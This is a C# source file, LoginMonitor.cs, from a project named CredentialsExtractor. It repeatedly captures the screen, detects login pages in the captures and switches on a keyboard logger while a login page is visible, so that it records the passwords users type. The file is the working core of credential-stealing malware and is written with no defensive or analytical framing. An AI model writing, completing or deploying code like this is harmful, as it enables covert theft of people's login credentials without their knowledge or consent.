// LoginMonitor.cs
using CredentialsExtractor.Configuration;
using CredentialsExtractor.Logging;
using CredentialsExtractor.Input;

namespace CredentialsExtractor.Core
{
    public class LoginMonitor : ILoginMonitor
    {
        private readonly IAppConfig _config;
        private readonly IScreenCapture _screenCapture;
        private readonly ILoginPageDetector _loginDetector;
        private readonly IKeyboardManager _keyboardManager;
        private readonly ILogger _logger;

        private CancellationTokenSource _cancellationTokenSource;
        private Task _monitoringTask;
        private bool _isDisposed = false;
        private bool _isCurrentlyOnLoginPage = false;

        public LoginMonitor(IAppConfig config, IScreenCapture screenCapture,
                           ILoginPageDetector loginDetector, IKeyboardManager keyboardManager,
                           ILogger logger)
        {
            _config = config;
            _screenCapture = screenCapture;
            _loginDetector = loginDetector;
            _keyboardManager = keyboardManager;
            _logger = logger;
        }

        public void Start()
        {
            if (_monitoringTask != null && !_monitoringTask.IsCompleted)
            {
                _logger.Log("Monitoring task is already running");
                return;
            }

            _cancellationTokenSource = new CancellationTokenSource();
            _monitoringTask = Task.Run(() => MonitoringLoop(_cancellationTokenSource.Token), _cancellationTokenSource.Token);

            _logger.Log("Login monitoring started");
        }

        public void Stop()
        {
            if (_cancellationTokenSource != null && !_cancellationTokenSource.IsCancellationRequested)
            {
                _cancellationTokenSource.Cancel();
                try
                {
                    _monitoringTask?.Wait(2000); // Give it 2 seconds to shutdown gracefully
                }
                catch (AggregateException)
                {
                    // Task was canceled, which is expected
                }

                _keyboardManager.StopKeylogger();
                _logger.Log("Login monitoring stopped");
            }
        }

        private async Task MonitoringLoop(CancellationToken cancellationToken)
        {
            bool keyloggerInitialized = false;

            // Initialize keyboard hooks but don't start logging yet
            _keyboardManager.Initialize();
            keyloggerInitialized = true;

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Capture screen with optimization to prevent high CPU usage
                    string screenshotPath = await Task.Run(() => _screenCapture.CaptureScreen());

                    if (File.Exists(screenshotPath))
                    {
                        // Check if it's a login page (potentially CPU intensive, so run in a separate task)
                        bool isLoginPage = await Task.Run(() => _loginDetector.IsLoginPage(screenshotPath));

                        // Update login page status and keyboard monitoring
                        if (isLoginPage != _isCurrentlyOnLoginPage)
                        {
                            _isCurrentlyOnLoginPage = isLoginPage;

                            if (isLoginPage)
                            {
                                _logger.Log("Login page detected. Activating keylogger...");
                                Console.WriteLine("Login page detected. Activating keylogger...");
                                _keyboardManager.EnableKeylogger();
                            }
                            else
                            {
                                _logger.Log("Login page no longer detected. Deactivating keylogger...");
                                Console.WriteLine("Login page no longer detected. Deactivating keylogger...");
                                _keyboardManager.DisableKeylogger();
                            }
                        }

                        // Delete the screenshot to save disk space
                        try
                        {
                            File.Delete(screenshotPath);
                        }
                        catch (IOException ioEx)
                        {
                            _logger.Log($"IO error deleting screenshot {screenshotPath}: {ioEx.Message}");
                        }
                        catch (UnauthorizedAccessException authEx)
                        {
                            _logger.Log($"Access denied when deleting screenshot {screenshotPath}: {authEx.Message}");
                        }
                        catch (Exception ex)
                        {
                            _logger.Log($"Error deleting screenshot {screenshotPath}: {ex.Message}");
                        }
                    }

                }
                catch (OperationCanceledException)
                {
                    // Expected when cancellation requested
                    break;
                }
                catch (Exception ex)
                {
                    _logger.Log($"Error during capture cycle: {ex.Message}");
                    Console.WriteLine($"Error: {ex.Message}");

                    // Add a small delay to prevent CPU spin in case of repeated errors
                    await Task.Delay(500, cancellationToken);
                }
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_isDisposed)
            {
                if (disposing)
                {
                    Stop();
                    _cancellationTokenSource?.Dispose();
                    _keyboardManager.Dispose();
                }

                _isDisposed = true;
            }
        }

        ~LoginMonitor()
        {
            Dispose(false);
        }
    }
}